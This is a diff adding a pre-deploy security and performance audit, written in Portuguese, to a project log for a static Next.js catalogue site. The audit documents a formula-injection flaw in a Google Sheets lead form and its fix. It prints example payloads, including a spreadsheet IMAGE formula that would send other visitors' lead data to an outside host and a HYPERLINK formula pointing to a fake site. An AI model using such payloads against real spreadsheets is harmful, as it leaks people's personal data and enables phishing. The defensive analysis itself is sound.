@@ -2746,6 +2746,165 @@ marcador melhor.
 
 ---
 
+## 34. Auditoría pré-deploy — quatro achados (01/09)
+
+Varredura antes de publicar, a pedido: build, bundle, pipeline de lead, links,
+assets e o Apps Script. **O build passa limpo** — 55 páginas, exit 0, com o
+`output: 'export'` já destravado. Quatro coisas mudaram. A primeira é falha de
+segurança de verdade; a segunda ameaça a regra 3 no dia do deploy.
+
+**Duas delas não terminam em commit** — precisam de mão humana em console de
+terceiro. Estão marcadas ⚠️ abaixo e repetidas no checklist do dia.
+
+---
+
+### 34a. Injeção de fórmula na planilha da BGA 🔴 segurança
+
+`clampField`, no Apps Script, aparava e truncava — e nada impedia um `=` no
+começo. **O Sheets avalia como fórmula toda célula cujo texto comece com
+`=`, `+`, `-` ou `@`**, e os dois formulários escrevem texto de visitante direto
+no `appendRow`.
+
+Quem preenchesse "Nombre / empresa" com
+
+```
+=HYPERLINK("https://sitio-falso.py";"Ver cotización BGA")
+```
+
+punha um link de aparência nativa na planilha que a Aida abre todo dia. Pior:
+`=IMAGE("https://.../x?d="&A2)` manda as linhas vizinhas — os outros leads — pra
+fora, sem clique nenhum.
+
+**Custo de explorar: zero.** A `leadWebhookUrl` e a chave estão no bundle público
+por desenho (e está certo que estejam — a decisão de 24/08 continua válida, isso
+nunca foi segredo de verdade), e o `doPost` aceita qualquer JSON.
+
+**O que mudou** — `clampField` agora prefixa apóstrofo quando o texto começa com
+um desses caracteres. O apóstrofo é o marcador de texto do Sheets: não aparece na
+célula. `=` no meio da frase ("Acosta = Eléctrica") não é tocado. Como os dois
+caminhos passam por `clampField`, **isto conserta também o formulário da home,
+que já está no ar hoje.**
+
+Entrou junto um teto de 200 itens no `doPost`: um POST forjado com milhares de
+linhas consome a cota diária do Apps Script, e cota estourada significa lead real
+deixando de gravar **em silêncio** — o `no-cors` esconde a falha, que é
+exatamente o ponto cego da seção 5.2.
+
+⚠️ **Ação manual, sem a qual nada disso vale:** o arquivo do repo é cópia de
+referência; o script que roda está na conta da BGA. Colar
+`docs/bga-leads-apps-script.gs` (agora v4) no editor e **publicar NOVA VERSÃO** —
+editar o `Code.gs` não implanta (runbook, Parte 5).
+
+**Commit:** `fix: neutraliza inyección de fórmula en la planilla de leads`
+
+---
+
+### 34b. Sem `amplify.yml`, o deploy podia não ser estático 🔴 regra 3
+
+Não havia build spec no repo. O Amplify autodetecta Next.js pelo `package.json` e
+gera uma que aponta pra `.next` com o runtime SSR; este projeto usa
+`output: 'export'` e escreve em `out/`. O resultado é ou deploy quebrado, ou —
+pior, porque é silencioso — **um servidor 24/7 na conta AWS do cliente**, que é o
+que a regra 3 e a seção 5.1b existem para impedir. Destravar o export e deixar a
+hospedagem decidir sozinha teria desfeito o trabalho todo.
+
+**O que mudou** — `amplify.yml` explícito na raiz, com `baseDirectory: out`.
+Levou junto as cabeçalhos de segurança que o export estático não consegue
+declarar no `next.config.mjs` (não há servidor pra emiti-las): `nosniff`,
+`SAMEORIGIN`, `Referrer-Policy`, `Permissions-Policy`. Mais `Cache-Control`
+imutável só pra `/_next/static`, que leva hash no nome — o HTML não foi tocado,
+tem que seguir revalidando ou um deploy novo não chega em quem já visitou.
+
+**Ficaram de fora, de propósito:** CSP (o site carrega o gtag de
+googletagmanager.com — uma CSP mal calibrada mata a medição sem avisar, o mesmo
+tipo de falha muda que já custou caro aqui; entra depois, testada no navegador) e
+HSTS (fica cacheado longo no navegador e o domínio ainda vai trocar de app).
+
+⚠️ **Ação manual:** ao conectar o repo, conferir no console que a app diz
+plataforma **"Web"** e não **"Web Compute"**. E olhar o primeiro build: se a
+imagem do Amplify subir com Node velho, o Next 14 reclama.
+
+**Commit:** `build: amplify.yml explícito — export estático, no SSR`
+
+---
+
+### 34c. O catálogo inteiro viajava em toda página 🟡
+
+`components/Header.jsx` é client e vive no layout raiz — e importava
+`getCategories()` de `lib/products.js`, que faz `import data from './catalog.json'`
+no topo. Medido no build: um chunk de **114 KB carregado em todas as páginas**,
+home inclusive, com os 87 produtos das 6 famílias — **inclusive as 5 que nem vão
+ao ar e cujos dados ainda estão incompletos.**
+
+Isso desfazia pela porta dos fundos a invariante que o `lib/search.js` documenta
+em texto ("é o que evita que o catálogo inteiro volte pro bundle do client") e
+para a qual o índice de busca foi construído. O índice resolveu a busca; o Header
+trouxe tudo de volta por outro caminho.
+
+**A causa real é mais ampla que o Header:** qualquer componente client que
+importe **qualquer coisa** de `lib/products.js` — até uma função pura como
+`getProductImageAlt` — leva o JSON junto. Eram quatro fazendo isso.
+
+**O que mudou:**
+
+1. `lib/product-helpers.js` — as funções puras (SKU composto, alt de imagem,
+   query de configuração, label legível) saíram do módulo que carrega o catálogo.
+   `products.js` reexporta todas, então nenhum import existente mudou.
+2. Header, ProductFinder e CatalogPageClient recebem as categorias **como prop**
+   do Server Component, com `productCount` já resolvido (`getCategoryNav` e
+   `getCategoryCards`). Em vez de mandar o catálogo e deixar o client filtrar,
+   manda-se só o que ele desenha.
+
+**Resultado medido:** o chunk de 114 KB desaparece; nenhuma string do catálogo
+sobra no JS. First Load JS: home 126→107 kB, `/catalogo` 119→100, família
+119→101, ficha 122→104, cotização 121→103.
+
+**Commit:** `perf: saca el catálogo completo del bundle del navegador`
+
+---
+
+### 34d. Dois menores
+
+- **`CartProvider` fazia `setItems(JSON.parse(saved))` sem conferir a forma.** Um
+  valor que desserialize pra algo que não seja array quebra o `items.reduce` do
+  próprio provider — e o provider embrulha o site inteiro, então o sintoma é
+  **tela branca em toda página**, irrecuperável a não ser limpando os dados do
+  site, que ninguém sabe fazer. Hoje não havia como acontecer (a chave
+  `bga-cart-v2` nasceu junto com o schema atual, no commit do item 1), mas a
+  próxima troca de schema é uma linha de distância. Agora valor estranho começa
+  com carrinho vazio.
+- **O fetch do formulário da home não tinha `keepalive`**, que o `lib/leads.js`
+  tem. Hoje não muda nada — o `window.open` abre outra aba e não descarrega a
+  página — mas os dois caminhos de captura têm que ter a mesma garantia.
+
+**Commit:** `fix: carrito no se rompe con localStorage corrupto; keepalive en la home`
+
+---
+
+### O que a auditoria olhou e está limpo
+
+Vale registrar, pra não reauditar: sitemap bate exatamente com as rotas geradas
+(50 URLs, nenhuma apontando pra 404; `/404`, `/cotacao` e
+`/politica-de-privacidad` fora, corretamente). Os 61 caminhos de asset do
+`catalog.json` e todos os referenciados no código resolvem pra arquivo real.
+Nenhum link interno quebrado no HTML gerado. Todo `target="_blank"` com
+`rel="noopener noreferrer"`. Os parâmetros de configuração da URL na ficha são
+validados contra valores reais do produto antes de aplicar — não dá pra injetar
+nada por ali. O JSON-LD só serializa dado local. O React escapa o `q` da busca.
+Nada sensível versionado, nenhum `.DS_Store` rastreado. Nenhum `force-dynamic`
+sobrando, e o `useSearchParams` tem sua fronteira de Suspense.
+
+### O que NÃO foi consertado, e por quê
+
+**O formulário da home manda nome e RUC na query string** para
+script.google.com. É inerente ao `doGet` do Apps Script e é o que já está
+publicado hoje — mas significa que esses dados ficam nos logs de requisição do
+Google. O caminho do carrinho (`doPost`) não tem isso. Só se resolve movendo o
+formulário da home para `doPost` também, que é mexer no que já está no ar; não é
+para fazer junto do lançamento.
+
+---
+
 ## Checklist do dia da publicação — só verificável no ar
 
 Junto com os itens 10 (404 no GA4) e 11 (política de privacidade):
@@ -2759,3 +2918,11 @@ Junto com os itens 10 (404 no GA4) e 11 (política de privacidade):
   sabendo. É por desenho (o WhatsApp é o canal real, a planilha é registro), mas
   significa que "lead não chegou" só se descobre olhando a planilha. Conferir a
   aba "Cotizaciones" nos primeiros dias.
+- **Apps Script v4 publicado?** (item 34a) O conserto da injeção de fórmula só
+  existe depois de colar o arquivo no editor e publicar **nova versão** — editar
+  o `Code.gs` não implanta. Vale também pro formulário da home, que já está no
+  ar. Testar depois: mandar um lead com `=1+1` no campo Nombre e conferir que na
+  planilha aparece o texto `=1+1`, não o número `2`.
+- **Plataforma do app no Amplify diz "Web", não "Web Compute"?** (item 34b) Se
+  disser Web Compute, há um servidor rodando na conta do cliente e o
+  `amplify.yml` não pegou.
